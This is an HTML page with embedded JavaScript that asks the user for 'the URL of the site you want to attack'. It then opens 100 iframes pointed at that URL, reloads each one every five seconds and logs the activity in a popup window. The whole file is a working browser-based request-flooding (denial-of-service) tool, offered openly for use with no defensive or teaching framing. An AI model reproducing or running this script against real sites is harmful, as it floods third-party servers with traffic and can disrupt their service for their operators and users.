<html>
    <head>
        <style>
            iframe {
                width: 10%;
                height: 10%;
                position: absolute;
                border: none;
            }

            @media (prefers-color-scheme: dark) {
                body {
                    background-color: black;
                }
            }

            @media (prefers-color-scheme: light) {
                body {
                    background-color: white;
                }
            }
        </style>
    </head>
    <body>
        <script>
            const iframeNum = 100;
            const reloadInterval = 5000;
            const iframeSrc = prompt("Please enter the URL of the site you want to attack.", "https://");
            const iframes = [];
            const popup = window.open("", "log", "width=500, height=700, scrollbars=yes");
            var doc = popup.document;
            doc.write("<style>* {font-family: monospace;padding: 20px;border-radius: 20px;}@media (prefers-color-scheme: dark) {body {background-color: black;color: white;box-shadow: 0 0 50px rgba(255, 255, 255, 0.5);}}@media (prefers-color-scheme: light) {body {background-color: white;color: black;box-shadow: 0 0 50px rgba(0, 0, 0, 0.5);}}</style><title>log</title>");

            function log(message) {

                let now = new Date();
                let year = now.getFullYear();
                let month = now.getMonth() + 1;
                let date = now.getDate();
                let hour = now.getHours();
                let minute = now.getMinutes();
                let second = now.getSeconds();
                let millisecond = now.getMilliseconds();
                function padZero(num) {
                    return num.toString().padStart(2, "0");
                }
                let datetime = `${year}/${padZero(month)}/${padZero(date)}/${padZero(hour)}:${padZero(minute)}:${padZero(second)}:${padZero(millisecond)}`;

                popup.document.write(datetime + "  " + message + "<br>");
                popup.scrollTo(0, popup.document.body.scrollHeight);
            }
            function calcPosition(index) {
                const iframeWidth = window.innerWidth * 0.1;
                const iframeHeight = window.innerHeight * 0.1;
                const marginX = (window.innerWidth - iframeWidth * 10) / 11;
                const marginY = (window.innerHeight - iframeHeight * 10) / 11;
                const posX = marginX + (iframeWidth + marginX) * (index % 10);
                const posY = marginY + (iframeHeight + marginY) * Math.floor(index / 10);
                return {
                    x: posX,
                    y: posY
                };
            }
            function createIframe(index) {
                const iframe = document.createElement("iframe");
                iframe.src = iframeSrc;
                const position = calcPosition(index);
                iframe.style.left = position.x + "px";
                iframe.style.top = position.y + "px";
                iframes.push(iframe);
                document.body.appendChild(iframe);
                log("iframe element " + index + " created. The position is (" + position.x + ", " + position.y + ").");
            }
            function reloadIframe(index) {
                const iframe = iframes[index];
                iframe.src = iframeSrc;
                log("Reloaded iframe element " + index + ".");
            }
            for (let i = 0; i < iframeNum; i++) {
                createIframe(i);
                setInterval(function() {
                    reloadIframe(i);
                }, reloadInterval);
            }
        </script>
    </body>
</html>
